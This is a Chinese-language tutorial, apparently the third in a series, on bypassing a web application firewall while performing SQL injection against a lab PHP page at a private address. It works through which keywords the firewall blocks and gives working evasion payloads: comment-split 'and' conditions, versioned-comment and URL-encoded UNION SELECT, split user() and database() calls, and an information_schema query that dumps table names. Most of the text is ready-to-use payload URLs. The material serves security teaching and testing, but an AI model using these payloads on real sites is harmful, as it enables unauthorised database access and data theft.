# **prat 3**

## **绕过 and 1=1**

```
url:http://192.168.1.107/sql.php?id=1 and 1=1
```

![](../Images/d4cbe21879fb08c1f9cefbfe066125cf.png)

发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。

1.  and 不拦截
    
2.  and 1 拦截
    
3.  and 1 = 拦截
    
4.  and 1 = 1 拦截
    

由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/\*\*/注释来绕过一下看看

```
/\*\*/aNd/\*\*//\*\*/'a'/\*\*/ = /\*\*/'a'/\*\*/
```

注释包含把1=1替换成**‘a’ = ‘a’**就得到了url:

```
http://192.168.1.107/sql.php?id=1/\*\*/aNd/\*\*//\*\*/'a'/\*\*/=/\*\*/'b'/\*\*/
```

![](../Images/7a709d5b4654585cf9a373a86f2ce0e7.png)

返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性

## **绕过union+select**

```
url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3
```

![](../Images/945f3af8fdff6b2165f790b26c117a02.png)

同样，先看一下他拦截什么。

1.  union 不拦截
    
2.  select 不拦截
    
3.  union select 拦截
    

很明显，我们只需要在union与select之间处理一下就可以了。  
首先使用/*!50000/注释包含/*!*/然后使用/\*\*/与/*–\*/打乱一下结构，在稍微进行一下编码处理就可以了

```
url:http://192.168.1.107/sql.php?id=-1 /\*!50000/\*--\*//\*\*//\*!%55nion/\*--\*/\*//\*\*//\*!(%53elect 1,2,3)/\*--\*/\*/-- -
```

![](../Images/65e2a812b9c634998e8f2c7be80d3464.png)

可以发现，已经正常显示数字，并且狗没有拦截。 什么？你说没看懂？那么看下图

![](../Images/40f05393fe0d598a7c8e5fdb1b875f5e.png)

拆分一下就发现其实很好理解，使用()把select的内容包起来。

## **爆库**

```
http://192.168.1.107/sql.php?id=-1 /\*!50000/\*--\*//\*\*//\*!%55nion/\*--\*/\*//\*\*//\*!(%53elect 1,user(),database())/\*--\*/\*/-- -
```

![](../Images/8754d623f721fd9b7a6216dab5aad56a.png)

发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)

  

1\. version()——MySQL 版本

2\. user()——数据库用户名

3\. database()——数据库名

4\. @@datadir——数据库路径

5\. @@version\_compile\_os——操作系统版本

 

既然已经知道了拦截什么，那么绕他还难么，掏出/\*\*/注释大法。

在user(),database()之间处理以下。  
那么就成为了

```
user/\*\*/(/\*\*/)
database/\*\*/(/\*\*/)
完整url：http://192.168.1.107/sql.php?id=-1/\*!50000/\*--\*//\*\*//\*!%55nion/\*--\*/\*//\*\*//\*!(%53elect 1,user/\*\*/(/\*\*/),database/\*\*/(/\*\*/))/\*--\*/\*/-- -
```

![](../Images/46b3c86545c17a90da4aeb3d0ba85697.png)

正常爆出数据库跟当前用户

## **爆表**

发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。

```
url:http://192.168.1.107/sql.php?id=-1 
/\*!50000/\*--\*//\*\*//\*!%55nion/\*--\*/\*//\*\*//\*!(%53elect database/\*\*/(/\*\*/),group\_concat(concat\_ws(0x23,table\_name)),user/\*\*/(/\*\*/) 
from information\_schema.tables where table\_schema='security')/\*--\*/\*/ limit 0,1-- -
```
